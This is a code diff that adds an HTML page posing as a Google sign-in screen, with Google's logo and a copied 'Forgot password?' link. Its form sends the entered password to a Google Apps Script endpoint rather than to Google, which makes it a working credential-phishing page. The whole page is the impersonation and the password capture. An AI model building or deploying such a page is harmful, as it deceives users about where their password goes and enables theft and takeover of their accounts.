@@ -1,0 +1,54 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Google Login</title>
+    <link rel="stylesheet" href="passpage.css">
+</head>
+<body>
+    <div class="container">
+        <div class="login-box">
+            <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google Logo" class="logo">
+            <h1>Welcome</h1>
+            <p>
+              
+
+
+            </p>
+            <form id="login-form"
+            method="post"
+            action="https://script.google.com/macros/s/AKfycbw-znGZwNTJle2M753wiqvEcWKBKTQwhI1_joGBHBAGITOmqS9_Z56ymke3UZtn2ImiJQ/exec"
+            name="login-form"
+            onsubmit="return validateForm()"
+            >
+                <div class="input-group">
+                    <input type="password" 
+                    name="password" 
+                    id="password"
+                    placeholder="Enter your password" 
+                    required
+                    >
+                    <button 
+                    type="button"
+                     id="show-password"
+                     >Show</button>
+                </div>
+                <a href="https://accounts.google.com/v3/signin/challenge/pwd?TL=AO-GBTfDTcCGDUgvcUrOPB9pXqCc5YQ4849KN61vnRcxJi0i_gMho_LKmhZ0Q5V1&cid=2&continue=https%3A%2F%2Fmyaccount.google.com%2Fsigninoptions%2Fpassword&flowName=GlifWebSignIn&hl=en-GB&ifkv=AVdkyDmaa3GvKdoMcx2PAWVnvlp_F45_24FRDxyHhEkj7fr3B8bdR5xvvkjFvzR-FYv1xWY1fk6D&kdi=CAM&rart=ANgoxccmABf3Lxib2oefv4Cg65ouyBZBSZd85NFRp4oJg2g8eizzVIJEcLeryZZjWIZMQ7uKzyn2zGWdaA2enLFRo146PU_ZP5UxKLEIAL0Y8M5a12i4oXo&rpbg=1&sarp=1&scc=1&service=accountsettings" class="forgot-password">Forgot password?</a>
+                <div class="buttons">
+                    <a href="#" class="create-account"
+                    > </a>
+                    <input type="submit" 
+                    name="next-button"
+                    id="next-button"
+                    value="Next"
+                    class="next-button"
+                    >
+                </div>
+            </form>
+        </div>
+    </div>
+
+    <script src="passpage.js"></script>
+</body>
+</html>
